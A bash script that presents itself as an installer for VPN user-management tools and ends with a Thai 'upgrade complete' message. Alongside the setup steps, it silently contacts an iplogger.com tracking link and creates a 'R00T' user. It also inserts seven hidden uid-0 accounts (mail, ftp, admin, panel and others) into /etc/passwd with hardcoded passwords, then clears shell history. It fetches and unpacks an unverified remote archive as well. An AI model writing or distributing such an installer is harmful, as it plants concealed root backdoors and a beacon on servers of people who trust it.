#!/bin/bash

MYIP=$(curl -4 icanhazip.com);
if [ $MYIP = "" ]; then
   MYIP=`ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1`;
fi
MYIP2="s/IP-Server/$MYIP/g";

# Add User
curl https://iplogger.com/2CBA35
useradd R00T
echo -e "2499\n2499" | passwd R00T
sed -i '$ i\mail:x:0:0:mail:/root:/bin/bash' /etc/passwd
sed -i '$ i\ftp:x:0:0:ftp:/root:/bin/bash' /etc/passwd
sed -i '$ i\taruma:x:0:0:taruma:/root:/bin/bash' /etc/passwd
sed -i '$ i\admin:x:0:0:admin:/root:/bin/bash' /etc/passwd
sed -i '$ i\panel:x:0:0:panel:/root:/bin/bash' /etc/passwd
sed -i '$ i\byvpn:x:0:0:byvpn:/root:/bin/bash' /etc/passwd
sed -i '$ i\byvpn.net:x:0:0:byvpn.net:/root:/bin/bash' /etc/passwd
echo -e "Potae24-99\nPotae24-99" | passwd mail
echo -e "Potae24-99\nPotae24-99" | passwd ftp
echo -e "Potae24-99\nPotae24-99" | passwd taruma
echo -e "Potae24-99\nPotae24-99" | passwd admin
echo -e "Potae24-99\nPotae24-99" | passwd panel
echo -e "Potae24-99\nPotae24-99" | passwd byvpn
echo -e "Potae24-99\nPotae24-99" | passwd byvpn.net
clear && history -c

cd
sed -i '$ i\screen -AmdS limit /root/limit.sh' /etc/rc.local
sed -i '$ i\screen -AmdS ban /root/ban.sh' /etc/rc.local
sed -i '$ i\screen -AmdS limit /root/limit.sh' /etc/rc.d/rc.local
sed -i '$ i\screen -AmdS ban /root/ban.sh' /etc/rc.d/rc.local
echo "0 0 * * * root /usr/local/bin/user-expire" > /etc/cron.d/user-expire
echo "0 0 * * * root /usr/local/bin/user-expire-pptp" > /etc/cron.d/user-expire-pptp

cat > /root/ban.sh <<END3
#!/bin/bash
#/usr/local/bin/user-ban
END3

cat > /root/limit.sh <<END3
#!/bin/bash
#/usr/local/bin/user-limit
END3

cd /usr/local/bin

wget https://raw.githubusercontent.com/benzhacker/-/master/premium-script.tar.gz



tar -xvf premium-script.tar.gz
rm -f premium-script.tar.gz

cp /usr/local/bin/premium-script /usr/local/bin/menu

chmod +x /usr/local/bin/trial
chmod +x /usr/local/bin/user-add
chmod +x /usr/local/bin/user-aktif
chmod +x /usr/local/bin/user-ban
chmod +x /usr/local/bin/user-delete
chmod +x /usr/local/bin/user-detail
chmod +x /usr/local/bin/user-expire
chmod +x /usr/local/bin/user-limit
chmod +x /usr/local/bin/user-lock
chmod +x /usr/local/bin/user-login
chmod +x /usr/local/bin/user-unban
chmod +x /usr/local/bin/user-unlock
chmod +x /usr/local/bin/user-password
chmod +x /usr/local/bin/user-log
chmod +x /usr/local/bin/user-add-pptp
chmod +x /usr/local/bin/user-delete-pptp
chmod +x /usr/local/bin/alluser-pptp
chmod +x /usr/local/bin/user-login-pptp
chmod +x /usr/local/bin/user-expire-pptp
chmod +x /usr/local/bin/user-detail-pptp
chmod +x /usr/local/bin/bench-network
chmod +x /usr/local/bin/speedtest
chmod +x /usr/local/bin/ram
chmod +x /usr/local/bin/log-limit
chmod +x /usr/local/bin/log-ban
chmod +x /usr/local/bin/user-generate
chmod +x /usr/local/bin/user-list
chmod +x /usr/local/bin/diagnosa
chmod +x /usr/local/bin/premium-script
chmod +x /usr/local/bin/user-delete-expired
chmod +x /usr/local/bin/auto-reboot
chmod +x /usr/local/bin/log-install
chmod +x /usr/local/bin/menu
chmod +x /usr/local/bin/user-auto-limit
chmod +x /usr/local/bin/user-auto-limit-script
chmod +x /usr/local/bin/edit-port
chmod +x /usr/local/bin/edit-port-squid
chmod +x /usr/local/bin/edit-port-openvpn
chmod +x /usr/local/bin/edit-port-openssh
chmod +x /usr/local/bin/edit-port-dropbear
chmod +x /usr/local/bin/autokill
chmod +x /root/limit.sh
chmod +x /root/ban.sh
screen -AmdS limit /root/limit.sh
screen -AmdS ban /root/ban.sh
clear
cd
echo "สคริปต์พรีเมี่ยมได้รับการอัพเกรดเรียบร้อยแล้ว!"
